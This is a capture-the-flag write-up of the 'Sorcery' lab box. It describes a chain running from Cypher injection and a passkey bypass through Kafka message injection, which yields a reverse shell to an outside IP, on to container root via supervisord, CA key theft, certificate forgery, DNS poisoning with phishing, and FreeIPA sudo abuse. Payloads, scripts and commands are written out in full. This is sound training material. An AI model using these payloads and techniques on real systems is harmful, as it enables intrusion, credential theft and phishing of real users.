# CTF – Sorcery (Writeup)

## Context
Sorcery is a Linux box built as a set of Docker microservices behind `sorcery.htb`.
The front-facing REST API is backed by a Neo4j graph database and uses WebAuthn
passkeys for login. Internally there is a "debug" service that can talk to a Kafka
broker, a supervisor-managed container, an anonymous FTP server holding a private CA,
an internal DNS (dnsmasq) and SMTP relay, and a FreeIPA realm that ultimately governs
root. The chain is long and crosses several containers.

## Recon
The attack surface (observed from the application, not a port scan):
- A REST API under `/api/...` using `Authorization: Bearer` tokens.
- A Neo4j graph DB reachable through the `products` endpoint (injectable).
- WebAuthn / passkey authentication for privileged accounts.
- An internal debug endpoint that proxies raw bytes to arbitrary `host:port`.
- A Kafka broker (`kafka:9092`) whose `update` topic is consumed by a worker.
- Internal `172.19.0.0/24` services: anonymous FTP, DNS (53), SMTP (1025).
- A FreeIPA domain for host/user management.

## Initial access – Cypher injection → admin password reset
The `products` API concatenates the product ID straight into a Neo4j Cypher query.
By URL-encoding a payload into the `id` path parameter I break out of the query,
`MATCH` the admin `User` node and overwrite its password with a hash I control:

```
GET /api/products/88b6b6c5-...-d255f47efb4f"} ) WITH result
    MATCH (u:User {username: 'admin'})
    SET u.password = '$argon2id$v=19$m=32768,t=2,p=1$c29tZXNhbHQ$TwnvITHeonF5W7P/GQH0sLr+yntWG4LeIZkd7sNFxwE'
    RETURN result { .*, description: 'admin password updated' } //
Authorization: Bearer <client_token>
```

The argon2id hash (salt `c29tZXNhbHQ` = `somesalt`) corresponds to the password
`P@ssw0rd123`, so admin now authenticates with credentials I know.

## Passkey bypass – virtual WebAuthn authenticator
Admin login is gated by a WebAuthn passkey. I bypassed it by opening Chrome DevTools
(F12), enabling the **WebAuthn** tab to create a *virtual authenticator*, then using
the app's "get passkey" flow to register a credential against it. Logging out and back
in as `admin` then completes the passkey challenge against my virtual authenticator,
giving an authenticated admin session.

## Remote code execution – debug endpoint SSRF → Kafka message injection
As admin I reached a debug endpoint that sends raw bytes to any internal host/port:

```json
{
  "host": "kafka",
  "port": 9092,
  "data": ["hex1", "hex2"],
  "expect_result": false,
  "keep_alive": false
}
```

A worker consumes messages from the Kafka `update` topic and executes their value. I
hand-built a raw Kafka `ProduceRequest` whose message value is a reverse-shell command,
and fed it to the debug endpoint as hex:

```python
import struct, zlib
topic = b"update"
value = b"bash -i >& /dev/tcp/10.10.14.145/4444 0>&1"

def msg(v):
    body = struct.pack(">BBi", 0, 0, -1) + struct.pack(">i", len(v)) + v
    crc = zlib.crc32(body) & 0xffffffff
    return struct.pack(">I", crc) + body

mset = struct.pack(">q", 0) + struct.pack(">i", len(msg(value))) + msg(value)
pdata = struct.pack(">i", 0) + struct.pack(">i", len(mset)) + mset
tdata = struct.pack(">h", len(topic)) + topic + struct.pack(">i", 1) + pdata
body = struct.pack(">h", 1) + struct.pack(">i", 10000) + struct.pack(">i", 1) + tdata
hdr  = struct.pack(">hhih", 0, 0, 42, 3) + b"dbg"
pkt  = struct.pack(">i", len(hdr) + len(body)) + hdr + body
print(pkt.hex())
```

The consumer ran the message and connected back — reverse shell inside the worker
container.

## Container root – writable supervisord config
The container ran `supervisord` as root, and its config was writable. I appended a
root program that creates a SUID bash, then forced a config reload by killing a
supervised process (dnsmasq) in a loop so supervisor restarts and picks up the new
block:

```bash
cat >> /etc/supervisor/supervisord.conf << 'EOF'

[program:privesc]
command=/bin/sh -c 'cp /bin/bash /tmp/.rootbash && chmod 4755 /tmp/.rootbash && touch /tmp/privesc_done'
user=root
autostart=true
autorestart=false
priority=999
startsecs=0
EOF

while true; do pkill -9 dnsmasq; sleep 0.2; done &
```

Then:

```
/tmp/.rootbash -p
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Root inside the container.

## Pivoting – internal scan + anonymous FTP loot
From the container I swept `172.19.0.0/24`. An FTP scan found an anonymous server:

```python
for i in range(1, 255):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(0.4)
    if s.connect_ex((f"172.19.0.{i}", 21)) == 0:
        print(f"[+] FTP on 172.19.0.{i}:21")
```

Listing and pulling files (anonymous login) yielded the internal root CA:

```python
from ftplib import FTP
ftp = FTP("172.19.0.8"); ftp.login()
ftp.retrbinary("RETR /pub/RootCA.key", open("RootCA.key","wb").write)
ftp.retrbinary("RETR /pub/RootCA.crt", open("RootCA.crt","wb").write)
```

The CA key was passphrase-protected; after decrypting it (`RootCA-decrypted.key`) I
could sign certificates trusted by every internal client.

## Credential capture – cert forgery + DNS poisoning + phishing
I minted a certificate for the internal Gitea host, signed by the stolen CA:

```
openssl req -new -key RootCA-decrypted.key -out git.csr \
  -subj "/CN=git.sorcery.htb" -addext "subjectAltName=DNS:git.sorcery.htb,DNS:*.sorcery.htb"
openssl x509 -req -in git.csr -CA RootCA.crt -CAkey RootCA-decrypted.key \
  -CAcreateserial -out git.crt -days 3650 -sha256 \
  -extfile <(echo "subjectAltName=DNS:git.sorcery.htb,DNS:*.sorcery.htb")
cat git.crt RootCA.crt > git.fullchain.crt
```

I poisoned the internal DNS by writing `git.sorcery.htb → my IP` into the dnsmasq
`addn-hosts` files and (re)starting dnsmasq, with a watchdog thread rewriting the file
and `SIGHUP`-ing dnsmasq to keep the record sticky:

```
echo "10.10.14.145 git.sorcery.htb" > /dns/hosts
/usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts --cache-size=0 &
```

Then I stood up a rogue HTTPS server on `:443` using the forged full chain, serving a
fake Gitea login form that logs whatever is submitted:

```python
httpd = HTTPServer(("0.0.0.0", 443), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("git.fullchain.crt", "RootCA-decrypted.key")
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
```

Finally I sent a phishing mail through the internal SMTP relay (`172.19.0.8:1025`),
spoofing `nicole_sullivan@sorcery.htb` and asking `tom_summers@sorcery.htb` to
"reconnect" to `https://git.sorcery.htb/user/login`. Because DNS resolves to my host
and the cert is CA-trusted, Tom's browser submits his credentials to my form — captured.

## Escalation – FreeIPA account takeover → root
With the recovered credentials (also confirmed via `linpeas`), I operated against
FreeIPA. I reset/leveraged `ash_winter` and logged in over SSH:

```
ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
# ssh ash_winter@sorcery.htb   (ash_winter:mamasita12)
```

Then I abused FreeIPA group and sudo-rule membership: add `ash_winter` to
`sysadmins`, refresh the Kerberos ticket so the new membership takes effect, add the
user to the `allow_sudo` rule, reload SSSD, and take root:

```
ipa group-add-member sysadmins --users=ash_winter
kinit ash_winter
ipa sudorule-add-user allow_sudo --users=ash_winter
sudo /usr/bin/systemctl restart sssd
sudo su -
```

## Conclusion
A Cypher injection in the products API reset the admin password, and a virtual
WebAuthn authenticator bypassed the passkey to log in as admin. An internal debug
endpoint let me inject a raw Kafka `ProduceRequest`; a worker consumed and executed
it, giving a shell. A writable `supervisord.conf` (reloaded by killing a supervised
process) gave root in the container. From there I looted a private CA over anonymous
FTP, forged a trusted certificate, poisoned internal DNS, and phished `tom_summers`'s
credentials through a rogue HTTPS Gitea and the internal SMTP relay. Those credentials
fed a FreeIPA account takeover (`ash_winter`), and manipulating IPA group/sudo-rule
membership escalated to root.

## Skills demonstrated
- Neo4j Cypher injection via a REST parameter (admin password overwrite)
- WebAuthn passkey bypass using a DevTools virtual authenticator
- SSRF through a debug proxy into a Kafka broker
- Hand-crafting a raw Kafka `ProduceRequest` for message-consumer command injection
- Supervisor config abuse for root inside a container (SUID bash)
- Internal network enumeration and anonymous FTP exfiltration
- Stealing a CA key and forging trusted TLS certificates
- DNS poisoning (dnsmasq) + rogue HTTPS + SMTP phishing for credential capture
- FreeIPA / Kerberos abuse: group and sudo-rule membership manipulation to root
